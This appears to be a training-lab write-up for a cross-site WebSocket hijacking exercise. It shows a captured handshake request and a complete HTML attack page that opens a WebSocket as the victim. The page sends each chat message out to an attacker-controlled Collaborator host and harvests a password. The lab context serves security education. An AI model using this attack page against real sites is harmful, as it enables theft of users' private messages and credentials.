# Cross-site WebSocket hijacking
Solution:
- Web application makes request for WebSocket Handshake
```html
GET /chat HTTP/1.1
Host: ac2a1ffd1fd68b0fc063bcf8008c00f5.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://ac2a1ffd1fd68b0fc063bcf8008c00f5.web-security-academy.net
Sec-WebSocket-Key: UDST+kjCMBw8abEJNzZ1Yw==
Connection: keep-alive, Upgrade
Cookie: session=bfGE5InbNpJERBUXcLQlGiCjU9rIcDHR
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket

```
- The request does not include any form of CSRF protection such as random tokens.
- This can be abused by malicious webapps to initiate actions (create a websocket connection) on behalf of the victim.
- After the connection is being made, the client sends a READY messages to inform the server that it is ready to communicate. The server then sends all the past chat to the client up to this point.
- If we can make the victim send the ready message, we will receive the chat history.
- Send the following page to the victim:
```html
<html>
<head><title>Just a title</title></head>
<body>
	<h1>Hello Worlds</h1>
	<script type="text/javascript">
		var ws = new WebSocket("wss://ac391fb21ee5cd7ac0840a8000f7001a.web-security-academy.net/chat");
		ws.onopen = function (event) {
			ws.send("READY");
		}
		ws.onmessage = function (event) {
			url = "http://<burp-collaborator-link>/?msg=" + btoa(event.data);
			
			xhr = new XMLHttpRequest();
			xhr.open("GET",url, true);
			xhr.send(null);
		}
	</script>
</body>
</html>
```
- In the Collaborator server, you'll receive the message containing the password